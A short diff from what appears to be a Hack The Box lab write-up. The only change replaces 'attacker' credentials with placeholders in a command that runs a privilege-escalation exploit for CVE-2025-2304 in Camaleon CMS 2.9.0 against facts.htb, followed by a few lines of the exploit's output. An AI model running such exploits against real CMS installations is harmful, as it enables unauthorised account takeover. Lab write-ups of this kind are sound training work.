@@ -718,7 +718,7 @@ Breakdown:
 
 ```shell
 ┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
-└─$ python3 exploit.py -u http://facts.htb -U attacker -P attacker --newpass attacker -e -r   
+└─$ python3 exploit.py -u http://facts.htb -U username -P password --newpass password -e -r  
 [+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
 [+]Login confirmed
    User ID: 5
